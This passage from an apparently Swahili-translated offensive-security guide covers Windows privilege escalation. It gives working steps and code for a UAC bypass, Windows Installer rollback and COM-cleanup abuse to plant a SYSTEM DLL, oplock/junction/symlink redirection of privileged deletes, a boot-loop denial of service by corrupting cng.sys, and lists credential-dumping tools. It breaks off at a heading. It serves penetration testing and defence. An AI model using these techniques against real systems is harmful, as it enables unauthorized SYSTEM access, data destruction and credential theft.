Hii huwezesha kuongeza upendeleo na kukwepa UAC kwa wakati mmoja kwa kutumia udhaifu huohuo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato imetiwa saini na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii ifuatayo:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na taarifa zote zinazohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hii ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuelekeza Junctions za Saraka ya Upakiaji kwenye Root Inayotolewa na Web Server

Programu inaweza kuunda saraka ndogo ya upakiaji yenye jina linalotabirika, kuandika humo jina la faili lililotolewa na mtumiaji, kisha kuchakata faili hiyo. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kufuta na kubadilisha saraka hiyo ndogo na NTFS junction kabla ya uandishi wa upande wa server, uandishi unaweza kufuata junction hadi kwenye saraka inayotolewa na web server. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa web service ikiwa server hutekeleza aina hiyo ya faili. Hii ni hali maalum ya programu inayoruhusu uandishi holela; saraka ya upakiaji inayoweza kuandikwa au junction iliyopo pekee haithibitishi uwezekano huo.

Kagua uundaji halisi wa path na muda wake katika upload handler, ruhusa halisi za mtumiaji za kufuta/kuunda saraka ndogo, ACL halisi za destination, iwapo writer hufuata reparse points, na iwapo web server hutekeleza faili katika destination hiyo. Thibitisha utambulisho wa process wa writer na web server kando. Ukaguzi usioingilia mfumo unaweza kuonyesha ACL za saraka na metadata ya reparse, lakini hauwezi kuthibitisha tabia ya handler au ubadilishaji wa junction utakaofanyika baadaye. Ikiwa utekelezaji unafanyika kwa akaunti ya service, kagua **token halisi ya process** kabla ya kuzingatia njia tofauti ya token-privilege.

## Usafishaji wa scheduled task yenye ruhusa za juu unaochochewa na WNF

Scheduled task inayokataa kuendeshwa kwa mikono bado inaweza kuwa na trigger inayopatikana kwa mtumiaji asiye na ruhusa za juu. Unakagua task yenye ruhusa za juu, export XML yake na uchunguze **triggers zote** pamoja na task DACL, principal na action. Hasa, `WnfStateChangeTrigger` hutaja state ya Windows Notification Facility (WNF); ikiwa state hiyo inayoweza kulindwa inaruhusu mtumiaji wa sasa kuchapisha update, mtumiaji anaweza kuanzisha task kwa njia isiyo ya moja kwa moja chini ya utambulisho wake uliosanidiwa licha ya `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Kwa mfano, task ya Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` iliendeshwa kama SYSTEM, ikakubali updates kwenye WNF state `7508BCA32C079E41` kutoka kwa mtumiaji wa kawaida, kisha ikakagua `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` hata Recall ikiwa imezimwa.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Ili kupima ufikikaji, suluhisha `ZwUpdateWnfStateData` kutoka `ntdll.dll`, tuma sasisho tupu kwa jina la state lenye baiti nane, kisha linganisha hali ya kurudisha na data ya mara ya mwisho ya task kuendeshwa au shughuli za Procmon. Probe ifuatayo iliyopunguzwa hutumia mfuatano wa baiti kutoka kwenye mfano wa task ya Recall; badilisha baiti hizo na zile zilizotolewa kwa task inayojaribiwa.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Kubadilisha recursive cleanup kuwa ufutaji wenye privileji

Primitive muhimu si trigger pekee, bali ni routine ya cleanup yenye privileji inayopokea directory inayodhibitiwa na attacker. Fuatilia operesheni kuanzia enumeration hadi mabadiliko ya mwisho: ugunduzi wa profile/session, children zilizochaguliwa kwa wildcard, `SHCreateItemFromParsingName`, na `IFileOperation::DeleteItem` ni viashiria dhabiti kwamba pathname iliyokaguliwa hapo awali itapitiwa baadaye kwa recursive. Ikiwa descendants hazifunguliwi relative to trusted directory handles na kuthibitishwa kabla ya kufutwa, attacker anaweza kubadilisha resolution kati ya enumeration na matumizi.<sup>[[43]](#references)</sup>

Oanisha WNF trigger na [oplock, junction na Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) iliyoelezwa hapa chini: oplock husimamisha cleaner baada ya kuchagua child halali, kisha ancestor inayoweza kuandikwa hubadilishwa ili ufutaji wenye privileji unapoendelea, uelekezwe kupitia `\RPC Control` hadi kwenye target iliyolindwa. Katika mnyororo wa Recall, hii ilisababisha ufutaji wa `C:\Config.Msi` na SYSTEM, uliohitajika kwa mbinu ya MSI rollback iliyoandikwa.<sup>[[31]](#references)[[43]](#references)</sup>

### Descendants zilizowekwa ndani hupita marekebisho ya juu juu ya reparse point

Kuthibitisha tu root inayodhibitiwa na attacker na child yake ya moja kwa moja hakulindi ufutaji wa recursive unaotumia pathname. Acha vitu hivyo vilivyokaguliwa viwe halali, kisha hamishia junction/oplock substitution kwenye child nyingine iliyo chini yake; `IFileOperation::DeleteItem` hatimaye hufikia descendant ambayo haijathibitishwa na kufuata target yake mpya. CVE-2026-20941 ilitokana na aina hii hasa ya marekebisho yasiyokamilika baada ya patch ya kwanza ya Recall kuthibitisha `UKP` na directory yenye umbo la GUID, lakini ikaacha operesheni ya zamani ya ufutaji wa recursive.<sup>[[43]](#references)</sup>

Muundo salama ni kufungua **kila descendant** relative to directory handle ambayo tayari imeaminiwa, kupata na kuthibitisha path/object iliyofikiwa hatimaye, kisha kuweka deletion disposition kwenye handle hiyo iliyothibitishwa. Usithibitishe prefix kisha urudi kwenye ufutaji wa recursive unaotumia path. Wakati wa kukagua patch, pia kagua structures kwenye call site halisi: katika kisa hiki, ukaguzi wa runtime wa `OBJECT_ATTRIBUTES` kwenye `NtCreateFile` ulionyesha `RootDirectory` isiyo null na jina relative la `{GUID}\\secure_file.lock`, na hivyo kupinga matokeo ya decompiler yaliyopotosha yaliyodokeza primitive ya pili ya `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Kutoka Kufuta/Kuhamisha/Kubadilisha Jina Folder Yoyote hadi SYSTEM EoP

Mbinu iliyoelezwa [**kwenye chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Shambulio hili kimsingi linahusisha kutumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha files halali na zenye nia ovu wakati wa mchakato wa uninstallation. Kwa hili, attacker anahitaji kuunda **MSI installer yenye nia ovu** itakayotumika kuteka folder ya `C:\Config.Msi`, ambayo baadaye itatumiwa na Windows Installer kuhifadhi rollback files wakati wa uninstallation ya MSI packages nyingine; rollback files hizo zitakuwa zimebadilishwa ili ziwe na malicious payload.

### Uingizaji wa njia ya cleanup ya Windows Installer COM (CVE-2025-27727)

Client mwenye privileji ndogo anaweza kufikia service ya SYSTEM `msiexec.exe` kupitia COM object ya `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering ilibaini kuwa calls husika za `IMsiServer` ni `MsiBeginTransactionW` kwenye vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` kwenye `0xC8`, na `CleanupTempPackages` kwenye `0x50`. Majina na offsets hizi zimepatikana kwa reverse engineering na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtu asiye administrator, `SetEEUIDirectoryAndFilter` hujifanya caller kwa muda tu inapofungua path iliyotolewa kwa kutumia `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hii inathibitisha kuwa caller anaweza kufuta directory na huzuia kufuata reparse point, lakini **haihusishi** file object iliyokaguliwa na cleanup ya baadaye, wala kuthibitisha kuwa Windows Installer ndiyo iliyoiunda.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` hupanga path kama folder bila kujali argument ya filter ya caller. Service huandika value ya `REG_DWORD` yenye jina maalum chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la value ni path inayodhibitiwa na caller na data `0x00000002` ndiyo alama ya folder. Kisha `CleanupTempPackages(NULL, FALSE)` huanzisha cleanup moja kwa moja. Worker wake mwenye elevated privileges huorodhesha registry values na kupitisha entries za folder kwa `FDeleteFolder` ya recursive bila kukagua chanzo cha path. Uondoaji wa kawaida ukishindwa, code pia huita `LockdownPath`, huondoa file attributes, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano wa chini kabisa wa calls uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive muhimu ni kutumia upya path, si kuelekeza upya junction. Sajili `C:\Config.Msi` iliyoundwa na mshambuliaji, iondoe, kisha Windows Installer iunde tena path hiyo hiyo ikiwa na data ya rollback iliyolindwa. Usafishaji huamini jina la zamani la `TempPackages` na kufuta directory mpya kama SYSTEM. Hii hupita mpaka uliokusudiwa na mitigation ya uaminifu wa uelekezaji upya inayotumia `FILE_FLAG_OPEN_REPARSE_POINT`, kwa sababu hakuna reparse point inayohitajika.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa kwenye rollback chain iliyo hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle uliyopewa `WRITE_DAC` kabla installer haijaweka ulinzi kwenye DACL. Handle iliyofunguliwa awali inaweza kurejesha DACL inayoruhusu ufikiaji kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha path hiyo kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` isiite `ScheduleFileOrFolderDelete` kipengele kipya cha gate kinapowezeshwa. COM call bado inaweza kurudisha mafanikio, lakini haiweki tena path inayodhibitiwa na mshambuliaji kwenye `TempPackages`. Sakinisha masasisho ya usalama ya Windows ya Aprili 2025 badala ya kutumia mafanikio ya kurudi kwa method kama kipimo cha patch.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu iliyofupishwa ni hii:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` ikiwa tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folder inayoweza kuandikika (`TARGETDIR`).
    - Weka alama ya **"UAC Compliant"** kwa installer, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ikiwa wazi kwa faili baada ya usakinishaji.

- Hatua ya 2: Anza Uninstall
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa uninstall huanza kuhamisha faili hadi `C:\Config.Msi` na kuzipa majina mapya ya faili za `.rbf` (nakala rudufu za rollback).
    - **Kagua handle ya faili iliyo wazi** kwa kutumia `GetFinalPathNameByHandle` ili kugundua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Usawazishaji Maalum
    - `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara `.rbf` inapoandikwa.
        - Kisha **husubiri** tukio jingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Ufutaji wa `.rbf`
    - Baada ya kupewa ishara, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia isifutwe**.
    - Kisha **tuma ishara ya kurudisha** ili uninstall ikamilike.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta maudhui yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` iko tupu**, tayari kutekwa.

> Katika hatua hii, **anzisha udhaifu wa kufuta folder kiholela katika kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts kwa Zilizo Hasidi**

- Hatua ya 6: Unda Tena `C:\Config.Msi` ikiwa na ACL dhaifu
    - Unda tena folder ya `C:\Config.Msi` wewe mwenyewe.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle wazi** wenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ikiwa na:
        - `TARGETDIR`: Mahali panapoweza kuandikika.
        - `ERROROUT`: Variable inayosababisha hitilafu ya kulazimishwa.
    - Usakinishaji huu utatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itakapotokea.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutuma ishara ya tukio `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea tukio la `.rbs created`:
        - Windows Installer **huweka tena ACL imara** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACL hutekelezwa **wakati wa kufungua handle pekee**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` kwa **rollback script bandia** inayoagiza Windows:
        - Irejeshe faili yako ya `.rbf` (DLL hasidi) kwenye **mahali penye ruhusa za juu** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` yako bandia yenye **DLL payload hasidi ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya tukio la sync ili installer iendelee.
    - **Custom action ya aina 19 (`ErrorOut`)** imesanidiwa **kufanya usakinishaji ushindwe kwa makusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako hasidi.
        - Hunakili DLL yako ya `.rbf` hadi mahali lengwa.
    - Sasa una **DLL yako hasidi katika path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Code ya SYSTEM
    - Endesha **binary inayoaminika inayopandisha ruhusa kiotomatiki** (kwa mfano, `osk.exe`) inayopakia DLL uliyo-hijack.
    - **Imekamilika**: Code yako inatekelezwa **kama SYSTEM**.


### Kutoka Kufuta/Kuhamisha/Kubadilisha Jina kwa Faili Holela hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotajwa hapo awali) hudhani unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu tu **kufuta faili kiholela**?

Unaweza kutumia **mambo ya ndani ya NTFS**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya faharasa** ya folda.

Kwa hiyo, ukifuta stream ya `::$INDEX_ALLOCATION` ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama vile:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Vipi ikiwa primitive yako hairuhusu kufuta files/folders zozote kiholela, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** wakati mchakato wenye privileged unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha mchakato wa SYSTEM (mf., `SilentCleanup`)
- Mchakato huu hukagua folda (mf., `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofikia `file1.txt`, **oplock huwashwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii huondoa yaliyomo kwenye `folder1` bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — hilo lingeachilia oplock mapema mno.

- Chaguo B: Badilisha `folder1` iwe **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga stream ya ndani ya NTFS inayohifadhi metadata ya folda — kuifuta kunafuta folda.

5. Hatua ya 5: Achilia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka kwa Uwezo wa Kuunda Folda Yoyote hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **driver muhimu ya Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ukiunda hii mapema kama folda, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Huona folda, **hushindwa kupata driver halisi**, na **huharibika au husitisha kuwasha**.
- **Hakuna njia mbadala**, na **hakuna urejeshaji** bila uingiliaji wa nje (k.m., boot repair au ufikiaji wa diski).

### Kutoka kwenye njia za kumbukumbu/chelezo zenye upendeleo + OM symlinks hadi kubatilisha faili yoyote kiholela / DoS ya kuwasha

Wakati **huduma yenye upendeleo** huandika kumbukumbu/exports kwenye njia inayosomwa kutoka kwenye **config inayoweza kuandikwa**, elekeza upya njia hiyo kwa **Object Manager symlinks + NTFS mount points** ili kubadilisha uandishi wenye upendeleo kuwa ubatilishaji wa faili yoyote kiholela (hata **bila SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (k.m., `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kuelekea `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye upendeleo inayoandika kwenye njia hiyo (log, export, report).

**Mlolongo wa mfano**
1. Soma config ili kupata tena eneo la log lenye upendeleo, k.m. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileged iandike log (kwa mfano, admin aanzishe "send test SMS"). Sasa maandishi yanaandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa upya (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya hulazimisha Windows kupakia driver iliyoharibiwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo service yenye privileged itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo kwenye `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na kuifanya kuwa mahali pa uhakika pa kusababisha DoS kwa data iliyoharibika.



## **Kutoka High Integrity hadi System**

### **Service mpya**

Ikiwa tayari unaendesha mchakato wa High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza service mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapotengeneza binary ya service, hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika haraka, kwa kuwa itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha maingizo ya registry ya AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata katika mchakato wa High Integrity), utaweza **kufungua karibu mchakato wowote** (isipokuwa michakato iliyolindwa) kwa kutumia SeDebug privilege, **kunakili token** ya mchakato huo, na kuunda **mchakato wowote kwa kutumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua mchakato wowote unaoendeshwa kama SYSTEM wenye token privileges zote** (_ndiyo, unaweza kupata michakato ya SYSTEM isiyo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kupandisha privileges katika `getsystem`. Mbinu hii inahusisha **kuunda pipe, kisha kuunda/ kutumia vibaya service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya mteja wa pipe (service) na kupata privileges za SYSTEM.\
Ukitaka [**kujifunza zaidi kuhusu name pipes, soma hapa**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka High Integrity hadi System kwa kutumia name pipes, soma hapa**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **kuteka dll** inayopakuliwa na **mchakato** unaoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa kutumia ruhusa hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya kupandisha privileges; aidha, ni **rahisi zaidi kuifanikisha kutoka kwenye mchakato wa High Integrity**, kwa kuwa utakuwa na **ruhusa za kuandika** kwenye folda zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora zaidi ya kutafuta njia za kupandisha privileges za Windows local:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imekithiri.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla na RDP. Tumia -Thorough kwenye mfumo wa ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imekithiri.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hujaribu passwords zilizokusanywa katika domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofing na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Upelelezi wa msingi wa Windows kwa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta udhaifu wa privesc unaojulikana (IMEPITWA NA WAKATI; tumia Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa local **(Unahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta udhaifu wa privesc unaojulikana (lazima icompile kwa kutumia VisualStudio) ([**imecompilewa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huchunguza host kutafuta misconfigurations (ni zaidi ya zana ya kukusanya taarifa kuliko privesc) (lazima icompile) **(**[**imecompilewa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye programu nyingi (exe iliyocompilewa awali inapatikana GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Toleo la PowerUp lililoandikwa kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompilewa awali inapatikana GitHub). Haipendekezwi. Haifanyi kazi vizuri katika Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe ya Python). Haipendekezwi. Haifanyi kazi vizuri katika Win10.

**Bat**

